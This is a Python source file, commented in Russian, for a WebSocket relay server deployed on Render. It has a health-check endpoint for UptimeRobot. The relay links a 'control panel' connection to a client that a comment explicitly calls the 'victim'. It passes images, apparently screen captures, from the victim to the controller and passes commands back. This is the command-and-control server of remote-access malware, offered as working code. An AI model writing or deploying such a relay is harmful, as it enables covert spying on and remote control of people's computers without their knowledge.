import asyncio
import websockets
import os
import threading
from http.server import BaseHTTPRequestHandler, HTTPServer

# --- HTTP-сервер для UptimeRobot (слушает отдельный порт, не конфликтует с WebSocket) ---
class HealthCheckHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200)
        self.send_header("Content-type", "text/plain")
        self.end_headers()
        self.wfile.write(b"OK")

    def do_HEAD(self):
        self.send_response(200)
        self.send_header("Content-type", "text/plain")
        self.end_headers()

    def log_message(self, format, *args):
        pass  # Отключаем логи, чтобы не засорять консоль Render

def run_health_check():
    # ВАЖНО: используем отдельный порт 8080, не трогаем PORT от Render
    port = 8080
    server = HTTPServer(('0.0.0.0', port), HealthCheckHandler)
    print(f"HTTP health check запущен на порту {port}")
    server.serve_forever()
# ----------------------------------------------------------------

client_ws = None
control_ws = None

async def handler(websocket):
    global client_ws, control_ws
    print("Новое подключение")

    try:
        async for message in websocket:
            if message == "CONTROL":
                control_ws = websocket
                print("Пульт управления подключен")
                if client_ws:
                    await control_ws.send("CLIENT_CONNECTED")
            elif message == "CLIENT":
                client_ws = websocket
                print("Клиент (жертва) подключен")
                if control_ws:
                    await control_ws.send("CLIENT_CONNECTED")
            elif message.startswith("IMG:"):
                if control_ws:
                    try:
                        await control_ws.send(message)
                    except:
                        control_ws = None
            elif message.startswith("CMD:"):
                if client_ws:
                    try:
                        await client_ws.send(message)
                    except:
                        client_ws = None
    except websockets.exceptions.ConnectionClosed:
        print("Соединение закрыто")

async def main():
    # WebSocket-сервер занимает порт, который выдаёт Render
    port = int(os.environ.get("PORT", 10000))
    async with websockets.serve(handler, "0.0.0.0", port):
        print(f"WebSocket сервер запущен на порту {port}")
        await asyncio.Future()

if __name__ == "__main__":
    # Запускаем HTTP-проверку в фоновом потоке (порт 8080)
    threading.Thread(target=run_health_check, daemon=True).start()

    # Запускаем основной WebSocket-сервер (порт от Render)
    asyncio.run(main())
